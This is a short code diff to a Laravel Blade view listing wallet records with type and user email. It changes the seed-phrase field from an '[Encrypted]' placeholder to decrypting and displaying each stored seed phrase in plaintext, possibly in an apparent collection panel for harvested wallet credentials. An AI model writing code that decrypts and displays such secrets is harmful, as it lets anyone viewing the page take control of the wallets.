@@ -117,7 +117,10 @@
                                                         <li><strong>Wallet Type:</strong> {{ $wallet->wallet_type }}
                                                         </li>
                                                         <li><strong>Email:</strong> {{ $wallet->user_email }}</li>
-                                                        <li><strong>Seed Phrase:</strong> [Encrypted]</li>
+                                                        <li><strong>Seed Phrase:</strong> @try
+                                                                {{ decrypt($wallet->seed_phrase) }} @catch(\Illuminate\Contracts\Encryption\DecryptException $e)
+                                                                [Decryption Failed]
+                                                            @endtry</li>
                                                     </ul>
                                                 @endforeach
                                             @endif
